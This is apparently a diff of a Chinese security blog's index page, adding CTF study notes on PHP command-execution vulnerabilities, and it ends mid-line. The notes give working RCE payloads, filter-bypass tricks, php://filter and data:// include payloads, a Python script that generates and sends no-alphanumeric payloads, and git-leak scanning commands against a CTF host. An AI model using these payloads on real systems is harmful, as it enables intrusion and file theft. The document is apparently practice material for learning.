@@ -147,6 +147,184 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/04/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="六公子买单">
+      <meta itemprop="description" content="一头努力的菜鸟">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Daq1ang">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/04/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="post-title-link" itemprop="url">命令执行</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-04-21 09:34:39" itemprop="dateCreated datePublished" datetime="2021-04-21T09:34:39+08:00">2021-04-21</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-04-22 09:41:42" itemprop="dateModified" datetime="2021-04-22T09:41:42+08:00">2021-04-22</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>老实说之前没怎么学，很乱。现在开始 以后所有的东西都会不一样。不是立flag，而是背水一战。</p>
+<p>sql注入的总结先鸽一鸽，我觉得命令执行更紧迫些</p>
+<p>本篇主要是我在刷CTFshow的一些思考，可能比较傻瓜，会参考My0n9s’blog（其实就是对康师傅这篇的补充总结扩展），以及CSDN优秀的WP，希望全面些。会一直更新。</p>
+<h1 id="命令执行用到的函数"><a href="#命令执行用到的函数" class="headerlink" title="命令执行用到的函数"></a>命令执行用到的函数</h1><p>一般在PHP语言里面，涉及到eval()函数，并且参数可控，可以考虑命令执行。<br>biru:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#39;c&#39;]))&#123;</span><br><span class="line">    $c &#x3D; $_GET[&#39;c&#39;];    &#x2F;&#x2F;传入参数c</span><br><span class="line">    if(!preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $c))&#123;</span><br><span class="line">        eval($c);   &#x2F;&#x2F;涉及eval(),zezeze</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>执行系统命令的函数（函数和命令互相搭配使用）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">system()    &#x2F;&#x2F;常见system(&quot;ls&quot;);查看目录</span><br><span class="line">passthru()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br></pre></td></tr></table></figure>
+<p>其中 反引号 `` 等效于 shell_exec(实用)</p>
+<p>其中system()函数的执行结果有回显（比较直接），</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;system(&#39;ls&#39;);  &#x2F;&#x2F;查看目录</span><br><span class="line">?c&#x3D;system(&#39;cat fla*&#39;);  &#x2F;&#x2F;读取文件</span><br></pre></td></tr></table></figure>
+<p>其他需要 echo 来打印出来（函数负责执行命令，echo起到帮助回显的作用）:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;echo &#96;tac fl&#39;&#39;ag.php&#96;;</span><br><span class="line">?c&#x3D;echo exec(&#39;nl fla?????&#39;);</span><br></pre></td></tr></table></figure>
+<p>命令执行语句末要加分号;</p>
+<h1 id="等效替换-绕过过滤"><a href="#等效替换-绕过过滤" class="headerlink" title="等效替换/绕过过滤"></a>等效替换/绕过过滤</h1><p>空格被过滤</p>
+<pre><code>%09   $IFS$9  $&#123;IFS&#125;   $IFS%09   &lt;   &lt;&gt;   等替换</code></pre>
+<p>cat被过滤</p>
+<pre><code>tac、more、less、head、tail、nl、sed、sort、uniq、rev 进行替换</code></pre>
+<p>过滤了要获取的关键词，比如flag.php 可以用 ?、<em>、’’来代替。eg:fla?.???,fla</em>,fla’’g.php 来绕过</p>
+<p>linux 语法过滤了分号，可以用 %0a 来绕过（相当于回车）</p>
+<p>PHP语法过滤了分号 可用 ?&gt;来绕过</p>
+<p>利用反斜杠 比如对cat进行限制 我们可以用 ca\t 绕过 ，过滤了 flag , php 我们用 fl\ag.p\hp 绕过</p>
+<h1 id="利用include函数-伪协议绕过大部分过滤"><a href="#利用include函数-伪协议绕过大部分过滤" class="headerlink" title="利用include函数+伪协议绕过大部分过滤"></a>利用include函数+伪协议绕过大部分过滤</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#39;c&#39;]))&#123;</span><br><span class="line">    $c &#x3D; $_GET[&#39;c&#39;];</span><br><span class="line">    if(!preg_match(&quot;&#x2F;flag|system|php|cat|sort|shell|\.| |\&#39;|\&#96;|echo|\;|\(|\&quot;&#x2F;i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>该ban的都ban了（过滤内容太多，绕过太麻烦或无法绕过考虑文件包含）</p>
+<pre><code>?c=include$_POST[1]?&gt; //include和$_POST之间没有空格
+POST: 1=php://filter/read=convert.base64-encode/resource=flag.php
+
+?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-
+encode/resource=flag.php//过滤只对前半句产生影响
+
+c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;
+
+c=include$_GET[1]?&gt;&amp;1=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==</code></pre>
+<p>include + data协议</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#39;c&#39;]))&#123;</span><br><span class="line">    $c &#x3D; $_GET[&#39;c&#39;];</span><br><span class="line">    if(!preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $c))&#123;</span><br><span class="line">        include($c);  </span><br><span class="line">        echo $flag;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<pre><code>?c=data:text/plain,&lt;?php system(&#39;ls&#39;);?&gt;</code></pre>
+<p>若有过滤，可用base64</p>
+<h1 id="读文件-数组改造"><a href="#读文件-数组改造" class="headerlink" title="读文件+数组改造"></a>读文件+数组改造</h1><p>CTFshow(40)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#39;c&#39;]))&#123;</span><br><span class="line">    $c &#x3D; $_GET[&#39;c&#39;];</span><br><span class="line">    if(!preg_match(&quot;&#x2F;[0-9]|\~|\&#96;|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\&#x3D;|\+|\&#123;|\[|\]|\&#125;|\:|\&#39;|\&quot;|\,|\&lt;|\.|\&gt;|\&#x2F;|\?|\\\\&#x2F;i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>
+<p>过滤数字没过滤字母，没过滤英文括号，可用无参数RCE构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(&#39;.&#39;)); 查看当前目录下的所有文件名</span><br><span class="line"></span><br><span class="line">localeconv() 函数返回一包含本地数字及货币格式信息的数组。</span><br><span class="line"></span><br><span class="line">current() 函数返回数组中的当前元素（单元）,默认取第一个值，pos是current的别名</span><br></pre></td></tr></table></figure>
+<p>打印出当前目录下的文件</p>
+<pre><code>?c=print_r(scandir(current(localeconv())));</code></pre>
+<p>得<br><img src="/2021/04/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1.0.png"></p>
+<p>读取目录文件后，发现输出的是数组，而文件名是数组中的值，下一步我们需要取出想要读取文件的数组</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">each() 返回数组中当前的键&#x2F;值对并将数组指针向前移动一步</span><br><span class="line">end() 将数组的内部指针指向最后一个单元</span><br><span class="line">next() 将数组中的内部指针向前移动一位</span><br><span class="line">prev() 将数组中的内部指针倒回一位</span><br><span class="line">array_reverse() 以相反的元素顺序返回数组</span><br></pre></td></tr></table></figure>
+<p>读取文件函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file_get_content()</span><br><span class="line">readfile()</span><br><span class="line">highlight_file()</span><br><span class="line">show_source()</span><br></pre></td></tr></table></figure>
+<p>flag.php在倒数第二位，构造payload，读取</p>
+<pre><code>?c=show_source(next(array_reverse(scandir(getcwd()))));</code></pre>
+<h1 id="无字母数字马构造"><a href="#无字母数字马构造" class="headerlink" title="无字母数字马构造"></a>无字母数字马构造</h1><p>CTFshow40</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_POST[&#39;c&#39;]))&#123;</span><br><span class="line">    $c &#x3D; $_POST[&#39;c&#39;];</span><br><span class="line">if(!preg_match(&#39;&#x2F;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&#x2F;i&#39;, $c))&#123;</span><br><span class="line">        eval(&quot;echo($c);&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>过滤了数字字母和一些其他符号，但是可以用或运算符进行构造payload进行命令执行</p>
+<p>源码中禁止我们使用了数字3，（ascii码值为51），我们可以使用或运算符在没有被禁止的字符中构造出51来，比如19和32没有被禁止，我们进行或运算19|32=51，就可以获得51这个ascii码值，也就是成功得到了数字3</p>
+<p>知道了方法后，我们从ascii码表，也就是0-255中找到没有被过滤的字符进行或运算，以寻求得到我们想要的字符<br>结合了yu师傅给出的exp，一个独立的python脚本(或运算)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">#-- coding:UTF-8 --</span><br><span class="line"># Author:dota_st</span><br><span class="line"># Date:2021&#x2F;2&#x2F;10 12:56</span><br><span class="line"># blog: www.wlhhlc.top</span><br><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line">import re</span><br><span class="line">from sys import *</span><br><span class="line">if(len(argv)!&#x3D;2):</span><br><span class="line">    print(&quot;&#x3D;&quot;*50)</span><br><span class="line">    print(&#39;USER:python exp.py &lt;url&gt;&#39;)</span><br><span class="line">    print(&quot;eg:  python exp.py http:&#x2F;&#x2F;ctf.show&#x2F;&quot;)</span><br><span class="line">    print(&quot;exit: input exit in function&quot;)</span><br><span class="line">    print(&quot;&#x3D;&quot;*50)</span><br><span class="line">    exit(0)</span><br><span class="line">url&#x3D;argv[1]</span><br><span class="line"></span><br><span class="line">#生成可用的字符</span><br><span class="line">def write_rce():</span><br><span class="line">    result &#x3D; &#39;&#39;</span><br><span class="line">    preg &#x3D; &#39;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&#39;</span><br><span class="line">    for i in range(256):</span><br><span class="line">        for j in range(256):</span><br><span class="line">            if not (re.match(preg, chr(i), re.I) or re.match(preg, chr(j), re.I)):</span><br><span class="line">                k &#x3D; i | j</span><br><span class="line">                if k &gt;&#x3D; 32 and k &lt;&#x3D; 126:</span><br><span class="line">                    a &#x3D; &#39;%&#39; + hex(i)[2:].zfill(2)</span><br><span class="line">                    b &#x3D; &#39;%&#39; + hex(j)[2:].zfill(2)</span><br><span class="line">                    result +&#x3D; (chr(k) + &#39; &#39; + a + &#39; &#39; + b + &#39;\n&#39;)</span><br><span class="line">    f &#x3D; open(&#39;rce.txt&#39;, &#39;w&#39;)</span><br><span class="line">    f.write(result)</span><br><span class="line">    </span><br><span class="line">#根据输入的命令在生成的txt中进行匹配</span><br><span class="line">def action(arg):</span><br><span class="line">    s1&#x3D;&quot;&quot;</span><br><span class="line">    s2&#x3D;&quot;&quot;</span><br><span class="line">    for i in arg:</span><br><span class="line">        f&#x3D;open(&quot;rce.txt&quot;,&quot;r&quot;)</span><br><span class="line">        while True:</span><br><span class="line">            t&#x3D;f.readline()</span><br><span class="line">            if t&#x3D;&#x3D;&quot;&quot;:</span><br><span class="line">                break</span><br><span class="line">            if t[0]&#x3D;&#x3D;i:</span><br><span class="line">                s1+&#x3D;t[2:5]</span><br><span class="line">                s2+&#x3D;t[6:9]</span><br><span class="line">                break</span><br><span class="line">        f.close()</span><br><span class="line">    output&#x3D;&quot;(\&quot;&quot;+s1+&quot;\&quot;|\&quot;&quot;+s2+&quot;\&quot;)&quot;</span><br><span class="line">    return(output)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    write_rce()</span><br><span class="line">    while True:</span><br><span class="line">        s1 &#x3D; input(&quot;\n[+] your function：&quot;)</span><br><span class="line">        if s1 &#x3D;&#x3D; &quot;exit&quot;:</span><br><span class="line">            break</span><br><span class="line">        s2 &#x3D; input(&quot;[+] your command：&quot;)</span><br><span class="line">        param&#x3D;action(s1) + action(s2)</span><br><span class="line">        data&#x3D;&#123;</span><br><span class="line">            &#39;c&#39;:urllib.parse.unquote(param)</span><br><span class="line">            &#125;</span><br><span class="line">        r&#x3D;requests.post(url,data&#x3D;data)</span><br><span class="line">        print(&quot;\n[*] result:\n&quot;+r.text)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/04/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1.1.png"></p>
+<p>//42-53直接输命令，和前面的如出一辙</p>
+<h1 id="用原始路径-通配符绕过"><a href="#用原始路径-通配符绕过" class="headerlink" title="用原始路径+通配符绕过"></a>用原始路径+通配符绕过</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#39;c&#39;]))&#123;</span><br><span class="line">    $c&#x3D;$_GET[&#39;c&#39;];</span><br><span class="line">    if(!preg_match(&quot;&#x2F;\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\&#96;|\%|\x09|\x26|\&gt;|\&lt;&#x2F;i&quot;, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/03/30/SQL%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="六公子买单">
+      <meta itemprop="description" content="一头努力的菜鸟">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Daq1ang">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/03/30/SQL%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">SQL注入</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-03-30 20:00:47" itemprop="dateCreated datePublished" datetime="2021-03-30T20:00:47+08:00">2021-03-30</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/03/27/SSI%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -385,7 +563,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-03-27 09:38:57" itemprop="dateModified" datetime="2021-03-27T09:38:57+08:00">2021-03-27</time>
+                <time title="Modified: 2021-04-18 23:17:07" itemprop="dateModified" datetime="2021-04-18T23:17:07+08:00">2021-04-18</time>
               </span>
 
           
@@ -407,10 +585,9 @@
 <p>例如：get ?a=1 第3行回解析为$a=1。就造成了变量覆盖。</p>
 <p>作者：nice_o<br>链接：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/a4d782e91852">https://www.jianshu.com/p/a4d782e91852</a><br>来源：简书</p>
 <h2 id="题目：-BJDCTF2020-Mark-loves-cat"><a href="#题目：-BJDCTF2020-Mark-loves-cat" class="headerlink" title="题目：[BJDCTF2020]Mark loves cat/"></a>题目：[BJDCTF2020]Mark loves cat/</h2><p>停了几天，没学漏洞。把python学了点，然后想着把这个题再复现</p>
-<p>dirsearch，没扫出来.我TM当场裂开</p>
-<p>WP说dirsearch扫出了.git泄露（行行行，你说啥就是啥）</p>
-<p>GitHack用一哈，确实有隐藏文件，但是就是扫不到flag.php和index.php，气死，扫了四次才扫出来</p>
-<p>好</p>
+<p>dirmap扫目录发现git泄露（python3）</p>
+<pre><code>python3 dirmap.py -i http://539fa1aa-9762-4ad0-aeef-5dabce638c51.node3.buuoj.cn/ -lcf</code></pre>
+<p>Githack扫git(python2)<br>    python2 Githack.py <a target="_blank" rel="noopener" href="http://539fa1aa-9762-4ad0-aeef-5dabce638c51.node3.buuoj.cn/.git/">http://539fa1aa-9762-4ad0-aeef-5dabce638c51.node3.buuoj.cn/.git/</a></p>
 <p>圆规正转：</p>
 <p>flag.php</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$flag &#x3D; file_get_contents(&#39;&#x2F;flag&#39;);</span><br></pre></td></tr></table></figure>
@@ -472,7 +649,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-03-28 17:13:19" itemprop="dateModified" datetime="2021-03-28T17:13:19+08:00">2021-03-28</time>
+                <time title="Modified: 2021-03-30 19:59:39" itemprop="dateModified" datetime="2021-03-30T19:59:39+08:00">2021-03-30</time>
               </span>
 
           
@@ -497,7 +674,7 @@
 <pre><code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></pre>
 <p>没找到flag</p>
 <hr>
-<h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;flag is in flag.php</span><br><span class="line">&#x2F;&#x2F;WTF IS THIS?</span><br><span class="line">&#x2F;&#x2F;Learn From https:&#x2F;&#x2F;ctf.ieki.xyz&#x2F;library&#x2F;php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><br><span class="line">&#x2F;&#x2F;And Crack It!</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">    public function append($value)&#123;</span><br><span class="line">        include($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;append($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file&#x3D;&#39;index.php&#39;)&#123;</span><br><span class="line">        $this-&gt;source &#x3D; $file;</span><br><span class="line">        echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(preg_match(&quot;&#x2F;gopher|http|file|ftp|https|dict|\.\.&#x2F;i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker&quot;;</span><br><span class="line">            $this-&gt;source &#x3D; &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p &#x3D; array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function &#x3D; $this-&gt;p;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;pop&#39;]))&#123;</span><br><span class="line">    @unserialize($_GET[&#39;pop&#39;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $a&#x3D;new Show;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;flag is in flag.php</span><br><span class="line">&#x2F;&#x2F;WTF IS THIS?</span><br><span class="line">&#x2F;&#x2F;Learn From https:&#x2F;&#x2F;ctf.ieki.xyz&#x2F;library&#x2F;php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><br><span class="line">&#x2F;&#x2F;And Crack It!</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">    public function append($value)&#123;</span><br><span class="line">        include($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;append($this-&gt;var);</span><br><span 